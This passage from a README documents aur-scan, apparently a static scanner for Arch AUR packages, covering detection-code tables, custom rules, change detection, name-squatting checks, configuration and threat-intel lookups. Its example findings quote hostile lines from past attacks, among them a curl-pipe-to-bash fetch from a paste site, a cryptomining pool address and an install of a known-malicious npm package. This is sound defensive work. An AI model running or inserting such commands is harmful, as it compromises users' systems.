| `OBF-007` | printf character assembly | Obfuscation | rules | CWE-506 |
| `OBF-008` | Alternate-encoding decode | Obfuscation | rules | CWE-506 |
| `OBF-011` | Interpreter here-string execution | Obfuscation | rules | CWE-94 |
| `PERSIST-003` | Cron job creation | Persistence | rules | - |
| `PERSIST-005` | XDG autostart creation | Persistence | rules | - |
| `PRIV-005` | Kernel module operations | Privilege Escalation | privilege | - |
| `PRIV-006` | Sudo in an install hook | Privilege Escalation | privilege | CWE-250 |
| `PROV-001` | Package gained risky behavior | Suspicious Metadata | provenance | CWE-506 |
| `SQUAT-002` | Package name is one keystroke from a widely-installed package | Malicious Code | squat | CWE-1007 |
| `SRC-002` | Suspicious source domain | Network Security | source | - |
| `SRC-003` | Raw IP address in source URL | Network Security | source | - |
| `SRC-004` | URL shortener in source | Network Security | source | - |
| `SRC-009` | Obfuscated IP in URL | Network Security | rules | CWE-94 |
| `SRC-010` | Source is a different owner's copy of the upstream repo | Network Security | source | CWE-494 |
| `TAMPER-013` | Security control disabled | Malicious Code | rules | CWE-693 |
| `TAMPER-017` | CA trust anchor injection | Malicious Code | rules | CWE-295 |
| `TRUST-001` | pacman keyring poisoning | Malicious Code | rules | CWE-494 |
| `URL-001` | Raw IP in URL | Network Security | rules | - |
| `URL-002` | URL shortener | Network Security | rules | - |
| `URL-003` | Dynamic DNS domain | Network Security | rules | - |

## MEDIUM severity

| Code | Name | Category | Detector | CWE |
|------|------|----------|----------|-----|
| `BIN-005` | Binary contains a packed or encrypted section | Obfuscation | binary | CWE-506 |
| `CHK-002` | MD5 checksums used | Cryptography | checksum | CWE-328 |
| `CHK-003` | SHA1 checksums used | Cryptography | checksum | CWE-328 |
| `CHK-004` | Some sources use SKIP checksum | Cryptography | checksum | CWE-354 |
| `CHK-008` | Malformed or wrong-length checksum | Cryptography | checksum | CWE-354 |
| `EXEC-005` | Detached background execution | Malicious Code | rules | CWE-506 |
| `META-005` | install= points outside the package | Suspicious Metadata | metadata | CWE-426 |
| `META-006` | backup= of a security-sensitive file | Suspicious Metadata | metadata | CWE-426 |
| `OBF-004` | String concatenation obfuscation | Obfuscation | rules | - |
| `OWN-002` | Package is orphaned and flagged out-of-date | Suspicious Metadata | ownership | - |
| `PRIV-004` | Capabilities being set | Privilege Escalation | privilege | CWE-250 |
| `SRC-001` | Insecure source/transport protocol | Network Security | source | CWE-319 |
| `SRC-005` | No sources with a build function | Configuration | source | - |
| `TRUST-002` | GPG key import at build time | Malicious Code | rules | CWE-494 |

## LOW severity

| Code | Name | Category | Detector | CWE |
|------|------|----------|----------|-----|
| `META-001` | Provides impersonation | Suspicious Metadata | rules | - |
| `META-002` | validpgpkeys declared but no signature verified | Suspicious Metadata | metadata | CWE-347 |
| `META-004` | epoch set (forces upgrade over the repo version) | Suspicious Metadata | metadata | - |
| `OWN-001` | Package is orphaned | Suspicious Metadata | ownership | - |
| `OWN-003` | Flagged out-of-date for over a year | Suspicious Metadata | ownership | - |
| `OWN-004` | New package with no community validation | Suspicious Metadata | ownership | - |
| `SQUAT-003` | Build variant is in different hands from its base | Suspicious Metadata | squat | - |
| `SRC-006` | VCS source from non-standard host | Network Security | source | - |
| `SRC-007` | VCS source not pinned to a commit | Network Security | source | CWE-494 |
| `SRC-008` | Source host differs from upstream url host | Network Security | source | - |

## INFO severity

| Code | Name | Category | Detector | CWE |
|------|------|----------|----------|-----|
| `TI-UNCHECKED-001` | Threat-intel lookups incomplete | Configuration | threat_intel | - |

## Custom & Community Rules

Every detection code lives in one authoritative **catalog**, so the index is
unique and auditable — run `aur-scan codes` to see it, or
`aur-scan explain <ID>` for any code. You can extend it with a few lines of
TOML; no rebuild required.

Drop `.toml` files into any of:

| Path | Scope |
|------|-------|
| `/usr/share/aur-scanner/rules.d/` | distro / package-shipped |
| `/etc/aur-scanner/rules.d/` | system administrator |
| `~/.config/aur-scanner/rules.d/` | per user |

```toml
[[rule]]
id = "ACME-001"                 # must be UNIQUE across the whole catalog
name = "Flags the ACME backdoor marker"
description = "Detects the marker string left by the ACME backdoor."
severity = "critical"           # critical | high | medium | low | info
category = "malicious_code"
recommendation = "Do not build; report the package."
file_types = ["pkgbuild", "install_script"]

[[rule.patterns]]
type = "regex"
pattern = "acme_backdoor_[0-9a-f]{8}"
```

Built-in detections can't be replaced or weakened. A rule whose `id` is already
used by a built-in, an analyzer code, or an earlier file is **rejected** with a
warning, so a file dropped into `rules.d/` can add detections but never lower
one. The loader also rejects, one rule or file at a time, unknown keys, rules
with no patterns, and patterns that don't compile; the rest of the directory
still loads. When running as root (the pacman hook), only the `/usr/share` and
`/etc` directories are read. `file_types` accepts `pkgbuild`,
`install_script`, and `source_file` (local scripts shipped next to the
PKGBUILD). A shipped example lives at
`/usr/share/aur-scanner/rules.d/example.toml`. Use an org-specific prefix.

## Change Detection

A PKGBUILD that was clean last week and is clean today is not the same thing as
a PKGBUILD that was clean last week and grew a `curl | sh` today. Both score
identically on a single scan; only the second is an incident.

Every AUR supply-chain campaign on record worked by **changing packages people
had already decided to trust** — the 2018 xeactor hijack and the June 2026
Atomic Arch wave both adopted abandoned packages and then modified them. The
change is the signal.

`check` and `install` record a small fingerprint of every package they scan
(under `$XDG_CACHE_HOME/aur-scan/history`, owner-readable only, mode 0700) and
compare the next scan against it. A `--local` directory claiming a package name
you did not explicitly request is scanned but **not** recorded, so it cannot
overwrite a real package's baseline:

| Code | Fires when | Severity |
|------|-----------|----------|
| `DIFF-001` | The package raises findings it did not raise last time | severity of the worst **new** finding |
| `DIFF-002` | The maintainer changed — **High** if a previously orphaned package was adopted | High / Medium |
| `DIFF-003` | A source now points at a `host/owner/repo` it did not use before | High |
| `DIFF-004` | An install scriptlet or ALPM hook was **added** (High) or changed (Medium) | High / Medium |

Deliberate non-behaviour:

- **A first scan is silent.** There is nothing to compare against, and a tool
  that complains about its own cold cache is noise.
- **A plain version bump is silent.** Packages update constantly. Only new risk,
  moved ownership, moved upstream, or a new install-time execution path is
  reported.
- **A corrupt or unwritable cache degrades to a first scan.** Change detection
  is layered on top of the scan and can never turn a good scan into a failure.

The history stores a summary — hashes, origins, finding IDs — not copies of
every PKGBUILD you have ever scanned. Keeping the files would be a liability
with no matching benefit.

For an explicit, stateless comparison of two directories (code review, CI), use
[`aur-scan diff`](#aur-scan-diff).

---

## Name Impersonation

The package name is the only thing most people read before typing `yay -S`.
Three separate attacks live in that gap, and they need very different evidence.

| Code | Detects | Severity |
|------|---------|----------|
| `SQUAT-001` | A name that **renders identically** to a trusted one — Cyrillic `а` for ASCII `a`, or `foo_bar` for `foo-bar` | Critical |
| `SQUAT-002` | One visually-similar or keyboard-adjacent keystroke from a high-value package, **and** no age or community standing of its own | High |
| `SQUAT-003` | A `-bin`/`-git` variant in different hands from its base package — **informational context only** | Low |
| `SQUAT-004` | A package inside a namespace **you declared you own**, published by an account you did not authorise | Critical |

These thresholds were set by measurement, not intuition, against all 15,436
official package names and all 119,170 AUR packages:

- Edit-distance matching produced **23,662** false positives for two-character
  edits and 2,039 for one-character insert/delete. Those kinds are **not
  implemented** — not tuned down, absent.
- Rendering collision produced **zero** false positives. Two honest packages
  never display the same name.
- One-character substitution produced 264 false positives corpus-wide (mostly
  locale families like `aspell-ca`/`aspell-cs`), and zero once restricted to a
  curated high-value target list and gated on registry standing.

### Why `SQUAT-003` is only informational

The AUR reserves no namespace: owning `foo` does not reserve `foo-bin`, and
users reasonably assume `foo-bin` is your binary build. That is a real attack.

It is also, measured against the live AUR, **42.5% of all build-variant
packages** — 5,650 of them, where one person packages the release and someone
else packages the git build. Narrowing to a differing upstream `url=` still
leaves 1,820, mostly a project homepage on one side and its git repo on the
other. No metadata field separates the impostor from those thousands, so the
scanner reports the shape and lets you judge, rather than accusing 5,650
maintainers of impersonation.

Likewise, a variant of an **official repo** package is never reported: an AUR
account is never the same hands as the Arch maintainers, so the comparison is
true by construction and would flag 4,997 legitimate packages including
`0ad-git` and `acl-git`.

### Making it decisive: `[[owned_namespaces]]`

The one thing that resolves the ambiguity is knowledge the scanner cannot
derive — *you* know which names you publish. Declare them and the ambiguous case
becomes a Critical with no false positives by construction:

```toml
[[owned_namespaces]]
prefix = "aur-scanner"
maintainers = ["KiefStudio"]
```

Any package matching `aur-scanner` or `aur-scanner-<variant>` maintained by
anyone other than `KiefStudio` — including an orphaned one — is reported at
Critical. The prefix matches the exact name or a `-`-separated suffix, so
`aur-scannerfoo` is *not* in the namespace.

Empty by default. No namespaces are assumed on your behalf.

> Name and ownership analysis need registry context — who maintains what, plus
> the official package list. `check`, `install`, `aur-scan-wrap`, and
> `system --rescan` all supply it. Four paths deliberately do not, and emit no
> `SQUAT-*` or `OWN-*` findings at all rather than guessing:
> `aur-scan scan ./dir` (no package identity to look up), `aur-scan diff`
> (compares two directories, and stays stateless for CI), the **pacman hook**
> (offline by design — it must not make network calls inside a transaction),
> and `aur-scan system` **without** `--rescan` (it reads a cached PKGBUILD and
> has no live registry record for it).* On those paths these codes are *not evaluated*, which is not the
> same as clean.

---

## Output Formats

### Text (Default)

Human-readable output with colored severity indicators:

```bash
aur-scan scan ./PKGBUILD
```

### JSON

Machine-readable JSON for scripting and automation:

```bash
aur-scan scan ./PKGBUILD --format json
```

**Example output:**

```json
{
  "package_name": "example-package",
  "package_version": "1.0.1-1",
  "scan_duration_ms": 45,
  "findings": [
    {
      "id": "DLE-001",
      "severity": "critical",
      "category": "command_injection",
      "title": "Curl pipe to shell",
      "description": "Downloading and executing remote scripts is extremely dangerous.",
      "location": {
        "file": "PKGBUILD",
        "line": 23,
        "column": 5,
        "snippet": "curl https://example.com/install.sh | bash"
      },
      "recommendation": "Download scripts first, review them, then execute",
      "cwe_id": "CWE-94"
    }
  ]
}
```

### SARIF

Static Analysis Results Interchange Format for CI/CD integration:

```bash
aur-scan scan ./PKGBUILD --format sarif > results.sarif
```

SARIF output is compatible with:
- GitHub Code Scanning
- Azure DevOps
- Visual Studio
- Other SARIF-compatible tools

---

## Configuration

### Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `AUR_SCAN_ENABLED` | `1` | Enable/disable scanning in shell integration |
| `AUR_SCAN_SEVERITY` | `high` | Minimum severity to display **and to block on** — the shell integrations pass it as both `--severity` and `--fail-on` |
| `AUR_SCAN_INTERACTIVE` | `1` | Prompt before proceeding |
| `AUR_SCAN_SCAN_UPGRADES` | `1` | On a system upgrade (`-Syu`/`-Syyu`/bare `yay`), scan **each** AUR package that has a pending update (resolved via the helper's `-Quaq`). A hijacked *update* is the primary AUR threat, so this is on by default; set `0` to skip it. |
| `AUR_SCAN_SCAN_GETPKGBUILD` | `0` | Also scan the package(s) on `-G`/`--getpkgbuild` (which only downloads a PKGBUILD to review). Off by default; set `1` to opt in. |
| `AUR_SCAN_MODE` | `gate` | `install` routes installs through `aur-scan install` (race-free build) instead of handing off to the helper |
| `AUR_SCAN_HOOK_STRICT` | `0` | Pacman hook: abort instead of warn when a foreign package can't be scanned (see Level 4) |
| `AUR_SCAN_VT_MAX_LOOKUPS` | `4` | VirusTotal lookups per scan when threat intel is on (config key `vt_max_lookups` wins) |

All four shell integrations (bash, zsh, fish, Nushell) and `aur-scan-wrap` honor these. The shell integration scans what's **named** on the command line — `-S pkg`, a bare `helper pkg`, `yay -Y pkg`, local build directories, and (above) the upgrade set. It cannot see the package chosen *after* an interactive search-and-select menu (`yay`'s default `-Y` mode resolves it at runtime); for that — and for any helper or path the shell functions don't wrap — enable the opt-in **pacman hook**, which fires on the exact package set of every transaction. `paru`, `yay`, `pikaur`, `trizen`, and `pakku` are wrapped as shell functions (they share pacman's `-S`/`-Syu` grammar); `aura` (installs via `-A`) and the subcommand-grammar tools (`aurutils`, `rua`, `pat-aur`) are covered by the pacman hook instead, which fires on every transaction regardless of helper.

**Color output** is on when writing to a terminal and automatically off when piped or redirected. Force it off with the global `--no-color` flag or by setting `NO_COLOR=1`.

### Configuration File

Config is **optional**. Without `-c` / `--config`, `aur-scan`, the pacman hook,
`aur-scan-wrap`, and `aur-scan install` all load the **first existing** file from:

1. `$XDG_CONFIG_HOME/aur-scanner/config.toml` (or `~/.config/aur-scanner/config.toml`)
2. `/etc/aur-scanner/config.toml`

If neither path exists, built-in defaults are used (fully offline, static). A
file that is present but unreadable or malformed is a **hard error** — the tool
will not silently ignore a broken security config. Pass `-c /path/to.toml` to
force a specific file.

Example (`/etc/aur-scanner/config.toml` or the user path above):

```toml
# Minimum severity to DISPLAY. Display only: gates, exit codes, and JSON/SARIF
# always see every finding.
min_severity = "low"

# Per-package network timeout in seconds (AUR RPC and git clone); check and
# install allow twice this for fetch + scan. A timeout fails closed.
timeout_seconds = 30

# Opt-in threat intelligence — OFF by default (see "Threat Intelligence" below)
enable_threat_intel = false

[threat_intel]
# VirusTotal API key (or env VT_API_KEY / VIRUSTOTAL_API_KEY)
# virustotal_api_key = "..."
urlhaus_enabled = false
# URLhaus Auth-Key — now mandatory at abuse.ch (or env URLHAUS_AUTH_KEY)
# urlhaus_auth_key = "..."
cache_duration_hours = 24
# VirusTotal lookups per scan (public API: 4/minute). Hashes past the cap, or
# after a rate-limit reply, are reported as TI-UNCHECKED-001, never dropped.
# vt_max_lookups = 4

# Cache settings
[cache]
enabled = true
directory = "/var/cache/aur-scanner"
max_size_mb = 100
ttl_hours = 24

# Human-readable output — which fields each finding prints (text format only).
# Rich by default: every field is shown unless you turn it off here. Set any to
# false to make the output terser. A mistyped key is a hard error, not a silent
# no-op.
[output]
line = true            # append (file:line) to each finding
snippet = true         # show the matched code line
recommendation = true  # show the remediation hint
cwe = true             # show the CWE reference

# Package-name namespaces YOU publish, and the accounts allowed to publish them.
# Empty by default — nothing is assumed on your behalf.
#
# The AUR reserves no namespace: owning `foo` does not reserve `foo-bin`, and
# anyone may publish it. Declaring your own names here turns that ambiguity into
# a Critical finding with no false positives, because it uses knowledge the
# scanner cannot derive. See "Name Impersonation".
#
# [[owned_namespaces]]
# prefix = "aur-scanner"
# maintainers = ["KiefStudio"]
```

**Every key is validated**, at the top level and inside every table
(`[output]`, `[threat_intel]`, `[cache]`, `[[owned_namespaces]]`). A mistyped key
anywhere in this file is a hard error rather than a silent no-op. A security
setting that quietly evaporates because of a typo is worse than one that fails
loudly: `virustotal_apikey` instead of `virustotal_api_key` would otherwise leave
you believing threat intel was on when it was not.

> **Display-only.** The `[output]` table changes *what is printed*, never which
> findings exist, the exit code, or whether a gate trips. The machine-readable
> `--format json` / `--format sarif` output always emits the complete record, so
> CI and tooling are never affected by a display preference. There is
> deliberately no key to suppress a finding itself.

### Threat Intelligence (opt-in)

By default aur-scan is fully offline and static. You can optionally cross-check a
package against external reputation services — it is **off unless you turn it on**,
and only data already public in the PKGBUILD is ever sent.

Enable it with `enable_threat_intel = true` and supply at least one provider key:

- **VirusTotal** — `virustotal_api_key` in config, or `VT_API_KEY` /
  `VIRUSTOTAL_API_KEY` in the environment. Checks each declared `sha256sums`
  entry and emits `TI-VT-001` when engines flag the hash.
- **URLhaus** — set `urlhaus_enabled = true` and supply `urlhaus_auth_key` (or
  `URLHAUS_AUTH_KEY`); abuse.ch now requires a free Auth-Key from
  <https://auth.abuse.ch/>. Checks each `source=` URL and emits `TI-URLHAUS-001`.

Guarantees:

- **Off by default, bring-your-own-key** — no key, no lookups, no egress.
- **Least disclosure** — only public source hashes and URLs leave your machine;
  never file contents or anything about you. Credentials embedded in a URL
  (`user:pass@`) and fragments are stripped before lookup.
- **Fail-open** — a provider error, quota limit, or outage never fails or blocks
  a scan.
- **Auditable egress** — every threat-intel call lives in one file
  (`crates/aur-scanner-core/src/threat_intel/remote.rs`): HTTPS-only,
  no-redirect, time-bounded, with capped response bodies. The only other
  network access is the AUR itself (RPC in `aur.rs` and the hardened
  `git clone`), held to the same rules.
- **Cached & capped** — verdicts are cached in your private (0700) cache
  directory with an integrity check that rejects corrupted entries, and
  VirusTotal lookups default to 4 per scan, the public API's per-minute quota,
  in the order the PKGBUILD declares them. Anything left unchecked by the cap
  or a rate-limit reply is reported as `TI-UNCHECKED-001`, so a quiet result
  never means "checked and clean" when it wasn't.

---

## Real-World Detection Examples

### Atomic Arch Supply-Chain Attack (June 2026)

Orphaned packages were adopted and their install hooks modified to pull a
malicious npm/bun package that drops an infostealer and eBPF rootkit. The
scanner flags both the install-hook behavior and the known-bad package names:

```
[CRITICAL] ATOMIC-002 Node/Bun package manager in install hook
    Location: alvr.install:4
    npm install atomic-lockfile

[CRITICAL] ATOMIC-001 Atomic Arch malicious npm/bun package
    Location: alvr.install:4
    Known-malicious package: atomic-lockfile

[CRITICAL] ATOMIC-001 Atomic Arch malicious npm/bun package
    Location: alvr.install:9
    Known-malicious package: js-digest (wave 2, Bun installer)
```

### CHAOS RAT Attack (July 2025)

The scanner would have detected this attack with the following findings:

```
[CRITICAL] PERSIST-006 Systemd masquerading
    Location: PKGBUILD:45
    Binary named like systemd component: 'systemd-initd'

[CRITICAL] INSTALL-001 Python execution in install script
    Location: librewolf-fix-bin.install:12
    Executing Python in post_install is suspicious

[CRITICAL] PERSIST-001 Systemd service creation
    Location: librewolf-fix-bin.install:15
    systemctl enable firefox-fix.service

[HIGH] HIDDEN-002 Tmp directory execution
    Location: PKGBUILD:23
    /tmp/systemd-initd
```

### 2018 Cryptominer Attack (xeactor)

```
[CRITICAL] DLE-001 Curl pipe to shell
    Location: PKGBUILD:18
    curl -s https://ptpb.pw/~x | bash

[CRITICAL] PASTE-001 Pastebin download
    Location: PKGBUILD:18
    Downloads from paste sites (ptpb.pw)

[CRITICAL] PERSIST-002 Systemd timer creation
    Location: PKGBUILD:34
    OnBootSec=1min

[CRITICAL] CRYPTO-001 Mining pool connection
    Location: hidden-script.sh:5
    stratum+tcp://pool.supportxmr.com:3333
```

---

## Project Architecture

```
ks-aur-scanner/
├── Cargo.toml                    # Workspace manifest (rust-version = 1.85)
├── crates/
│   ├── aur-scanner-core/         # Core analysis engine (library)
│   │   └── src/
│   │       ├── lib.rs            # Public API: Scanner, scan pipeline
│   │       ├── types.rs          # Severity, Finding, ScanConfig, ScanResult
│   │       ├── pkgfiles.rs       # Bounded, symlink-safe reads of package files
│   │       ├── parser/           # Static PKGBUILD / .install parsing
│   │       ├── resolve.rs        # Static variable resolution, payload decoding
│   │       ├── textutil.rs       # De-obfuscation helpers
│   │       ├── rules/            # Pattern rule engine, built-ins, rules.d loader
│   │       ├── catalog/          # The single index of every detection code
│   │       ├── analyzer/         # Structural analyzers (binary, checksum, deep,
│   │       │                     #   ioc, metadata, ownership, pattern, privilege,
│   │       │                     #   remote_exec, source, squat, threat_intel)
│   │       ├── aur.rs            # AUR RPC client and hardened git clone
│   │       ├── depgraph.rs       # Dependency tree resolution (AUR + pacman)
│   │       ├── registry.rs       # AUR metadata context for ownership checks
│   │       ├── overlay.rs        # Local package dirs layered over the AUR
│   │       ├── squat.rs          # Name-impersonation scoring
│   │       ├── history.rs        # Scan history and change detection (DIFF-*)
│   │       ├── provenance.rs     # PROV-001 risky-behavior gain
│   │       ├── sbom.rs           # CycloneDX 1.5 SBOM and tree rendering
│   │       ├── elf.rs            # Bounded ELF header reader (BIN-*)
│   │       ├── neturl.rs         # URL parsing and normalization
│   │       ├── validate.rs       # Package-name validation
│   │       ├── threat_intel/     # IOC database and opt-in remote lookups
│   │       ├── cache/            # Integrity-checked disk cache
│   │       └── error.rs          # Error types
│   ├── aur-scanner-cli/          # CLI binary (aur-scan)
│   │   ├── src/{main.rs, commands/, output/}
│   │   └── tests/                # End-to-end tests against the real binary
│   ├── aur-scanner-hook/         # Pacman hook binary (aur-scan-hook)
│   └── aur-scanner-plugin/       # AUR helper wrapper (aur-scan-wrap)
│       ├── src/bin/wrapper.rs
│       └── tests/shell_gate.rs   # Drives every shell integration with stub helpers
├── install/                      # Shell integrations, pacman hook, rules.d examples
├── aur/                          # Published AUR package definitions
├── tests/                        # PKGBUILD fixtures and VM acceptance test
└── PKGBUILD                      # Local development build of this checkout
```

---

## Dependencies

### Build Dependencies

| Crate | Version | Purpose |
|-------|---------|---------|
| `tokio` | 1.40 | Async runtime |
| `async-trait` | 0.1 | Async trait support |
| `futures` | 0.3 | Future combinators |
| `regex` | 1.11 | Pattern matching |
| `lazy_static` | 1.5 | Compile-time regex |
| `serde` | 1.0 | Serialization |
| `serde_json` | 1.0 | JSON support |
| `toml` | 0.8 | Configuration parsing |
| `thiserror` | 1.0 | Error handling |
| `anyhow` | 1.0 | Error context |
| `tracing` | 0.1 | Logging |
| `tracing-subscriber` | 0.3 | Log formatting |
| `clap` | 4.5 | CLI argument parsing |
| `reqwest` | 0.12 | HTTP client (native-tls) |
| `chrono` | 0.4 | Date/time handling |
| `colored` | 2.1 | Terminal colors |
| `blake3` | 1.5 | Fast hashing |
| `sha2` | 0.10 | SHA-256 checksums |
| `base64` | 0.22 | Base64 encoding |
| `clap_complete` | 4.5 | Shell completion generation |
| `dirs` | 5.0 / 6.0 | Standard config and cache paths |
| `tempfile` | 3.14 | Scratch directories for fetched packages |
| `url` | 2.5 | URL parsing |
| `libc` | 0.2 | Invoking-user lookup and safe file opens in the pacman hook |

### Runtime Dependencies

`gcc-libs` and `openssl` — the binary dynamically links OpenSSL via reqwest's native-tls backend.

### System Requirements

- Arch Linux (or Arch-based distribution)
- Rust 1.85+ (for building; `rust-version` in `Cargo.toml`, checked in CI)
- `pacman` (for system audit feature)

---

## Building from Source

### Prerequisites

```bash
# Install Rust via rustup
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# Ensure cargo is in PATH
source ~/.cargo/env
```

### Build

```bash
# Clone repository
git clone https://github.com/KiefStudioMA/ks-aur-scanner.git
cd ks-aur-scanner

# Build release version (optimized)
cargo build --release

# Binaries are in target/release/
ls -la target/release/aur-scan*
```

### Build Options

```bash
# Debug build (faster compilation, slower runtime)
cargo build

# Release build with full optimizations
cargo build --release

# Check for errors without building
cargo check

# Build with all warnings as errors
RUSTFLAGS="-D warnings" cargo build
```

---

## Testing

```bash
# Run all tests
cargo test

# Run tests with output
cargo test -- --nocapture

# Run specific test
cargo test test_detect_curl_bash

# Run clippy lints
cargo clippy

# Check formatting
cargo fmt --check
```

### Test Coverage

The test suite includes:
- Unit tests for the parser, resolver, rule engine, and every analyzer
- End-to-end tests that run the real `aur-scan` binary against fixture
  PKGBUILDs, including output-format contracts (JSON/SARIF stay valid)
- Detection tests in both directions: the malicious form fires, the benign
  form doesn't, plus an evasion fuzzer that mutates known payloads
- Fail-closed tests: unreadable, oversized, symlinked, and non-UTF-8 package
  files; unresolved dependencies; declined or non-terminal prompts
- A shell-gate harness that drives the bash, zsh, fish, and Nushell
  integrations and `aur-scan-wrap` against stub helpers
  (`cargo test -p aur-scanner-plugin --test shell_gate`; a missing shell skips)
- Dependency resolution and AUR client logic, tested offline through fakes
  (two live-network tests are `#[ignore]`d)
- A README sync test that keeps the detection tables above identical to the
  catalog

---

## License

This software is licensed under the **GNU General Public License v3.0 or later** (GPL-3.0-or-later).

You are free to use, modify, and distribute this software under the terms of the GPL-3.0. See the [LICENSE](LICENSE) file for the complete license text.

### Commercial Use and Attribution

Commercial use is permitted under the GPL-3.0 license. However, commercial users are kindly requested to:

- Provide attribution to **Kief Studio** with a do-follow link to [https://kief.studio](https://kief.studio)
- Consider supporting continued development of this project

This attribution request is not a legal requirement but is appreciated and helps sustain open source security tooling for the Arch community.

### Commercial Support

For commercial support, custom development, or enterprise licensing inquiries:

- **Website:** [https://kief.studio](https://kief.studio)
- **Email:** packages@kief.studio

---

## Contributing

This is a security tool a lot of people now rely on, and it shouldn't depend on
one person. **Contributors are genuinely welcome** — the whole point of the
auditable [detection catalog](#detection-rules-reference) and the community
[`rules.d/`](#custom--community-rules) format is so anyone can extend it without
touching the core.

Good places to start (look for [`good first issue`](https://github.com/KiefStudioMA/ks-aur-scanner/labels/good%20first%20issue)):

- **Detection rules** — patterns for emerging threats, as a community TOML rule or a built-in
- **False-positive fixes** — tighten a pattern that cries wolf (like the `chmod 755` one we fixed in 1.0.2)
- **AUR-helper integrations** — more shells/helpers (fish was added by a contributor in 1.0.3)
- **Docs, tests, fixtures**

**Read [CONTRIBUTING.md](CONTRIBUTING.md) first** — it spells out the bar. The
short version, because this is a security tool and the bar does not move:

- **Static-only is a hard invariant.** The scanner must *never* execute, source, or fetch-and-run a package it inspects. PRs that breach this are rejected on principle.
- **Every detection code lives in the auditable catalog** and is covered by the uniqueness/coverage tests — no orphan rules.
- **Tests + `cargo clippy` (no warnings) + `cargo fmt` are required.** New behavior needs new tests.
- **No change may weaken an existing security check** to make something simpler or faster.
- **`main` requires signed, reviewed commits** (enforced by a branch ruleset). Every change is reviewed before it lands; merges are GPG-signed. See CONTRIBUTING.md for how that works with your fork.

---

## Security

See **[SECURITY.md](SECURITY.md)** for the full policy and threat model.

### Reporting vulnerabilities

Report privately — **do not** open a public issue:

- **Email:** security@kief.studio (or use GitHub's *Report a vulnerability* button)

### How this project protects itself

A security tool has to be trustworthy end-to-end, so the supply chain around it
is hardened too:

- **The scanner is static-only** — it reads PKGBUILDs and install scripts; it never executes, sources, or fetches-and-runs the package it inspects. The scan cannot compromise the machine doing the scanning.
- **Releases are GPG-signed.** Tags are signed, and the tagged AUR packages verify the signature (`validpgpkeys`) instead of trusting a tarball hash. Verify with `git verify-tag v<version>`.
- **`main` and release tags are protected** by a branch ruleset: signed commits required, no force-push, no deletion. Every change is reviewed.
- **One auditable catalog.** Every detection code is indexed and uniqueness-tested, so what the tool *can* flag is always reviewable (`aur-scan codes`).

### Limits (be honest about them)

- Static analysis cannot catch every novel or heavily-obfuscated attack
- Sandboxed dynamic analysis is out of scope by design (that's what keeps it safe to run)
- For critical systems, still review PKGBUILDs yourself — this is defense-in-depth, not a guarantee

---

## Credits

**Developed by [Kief Studio](https://kief.studio)**

This project was created to address a critical gap in the Arch Linux security ecosystem. Special thanks to the security researchers who documented the attacks that informed our detection rules.

### Contributors

Built by the community, not just us. Thank you:

- [**@Disklo** (Rafael Lucio)](https://github.com/Disklo) — fixed a false-negative in `aur-scan check` and added the fish shell integration ([#4](https://github.com/KiefStudioMA/ks-aur-scanner/pull/4), 1.0.3)
- [**@SuitablyMysterious**](https://github.com/SuitablyMysterious) — contributed the June 2026 "Atomic Arch" malware package list now in the IOC database ([#3](https://github.com/KiefStudioMA/ks-aur-scanner/pull/3)), and originated the idea of VirusTotal + abuse.ch/URLhaus threat-intelligence checks and of inspecting the prebuilt binary a `-bin` package ships ([#9](https://github.com/KiefStudioMA/ks-aur-scanner/pull/9)). Both ship reimplemented from scratch — threat intel with fully isolated network egress, and the binary analyzer with a hand-written bounded ELF reader rather than a new dependency — but the direction was theirs, and the static-only framing in that PR was right.
- [**@gulamovzavohir02-glitch**](https://github.com/gulamovzavohir02-glitch) — found and fixed the `FUNC-001` false positive on build targets like `libcurl` ([#35](https://github.com/KiefStudioMA/ks-aur-scanner/pull/35)). It landed reimplemented, together with a comment-bypass fix that reviewing it turned up.

Some of the above were brought in by cherry-pick rather than the merge button — the work landed and the credit stands the same.

**Issue reports that shaped releases:**

- [**@LunarEclipse363**](https://github.com/LunarEclipse363) — [#2](https://github.com/KiefStudioMA/ks-aur-scanner/issues/2): detecting third-party package-manager calls in install hooks, which shaped the install-hook detection (`ATOMIC-002`)
- [**@zebulon2**](https://github.com/zebulon2) — [#10](https://github.com/KiefStudioMA/ks-aur-scanner/issues/10): reported the obfuscated `bun install` payload class the anti-evasion hardening targets
- [**@nikoraasu**](https://github.com/nikoraasu) — [#12](https://github.com/KiefStudioMA/ks-aur-scanner/issues/12): diagnosed that the shell wrapper only gated `-S`-style operations, shaping the operation classifier and broader AUR-helper coverage

Sent a PR? Add yourself here. See the full list on the [contributors page](https://github.com/KiefStudioMA/ks-aur-scanner/graphs/contributors).

Being listed here means your code, idea, or report shaped something that
landed — as authored commits, or reimplemented with credit as described above.
GitHub's contributors sidebar lists commit authors only. It does not mean you maintain this project, review it, or vouch for
it: [Kief Studio](https://kief.studio) does that, and the responsibility is ours.
The distinction protects contributors as much as it does us.

### References

- Arch Linux Security Advisory regarding 2018 AUR malware
- CHAOS RAT analysis (July 2025)
- CWE (Common Weakness Enumeration) database
- OWASP guidelines for code injection prevention

---

## Disclaimer

This tool provides an additional layer of security but **does not guarantee complete protection**.

- Static analysis cannot detect all forms of malicious behavior
- Obfuscated or novel attack patterns may evade detection
- False positives may occur; always verify findings
- This tool supplements but does not replace manual PKGBUILD review

The AUR is an inherently trust-based system where users are expected to verify package contents before installation. This scanner is a defense-in-depth measure, not a security guarantee.

**Use at your own risk. The authors are not responsible for any damage caused by malicious packages, whether detected or not.**

---

## Links

- **AUR Package:** [aur-scanner](https://aur.archlinux.org/packages/aur-scanner) (stable, recommended) — also [`aur-scanner-rc`](https://aur.archlinux.org/packages/aur-scanner-rc) (release candidate) and [`aur-scanner-git`](https://aur.archlinux.org/packages/aur-scanner-git) (rolling)
- **Docs:** [https://aur-scanner.kief.studio](https://aur-scanner.kief.studio)
- **Repository:** [https://github.com/KiefStudioMA/ks-aur-scanner](https://github.com/KiefStudioMA/ks-aur-scanner)
- **Crates.io:** [aur-scanner-core](https://crates.io/crates/aur-scanner-core)
- **Homepage:** [https://kief.studio](https://kief.studio)
- **Issues:** [https://github.com/KiefStudioMA/ks-aur-scanner/issues](https://github.com/KiefStudioMA/ks-aur-scanner/issues)
- **License:** [GPL-3.0-or-later](LICENSE)
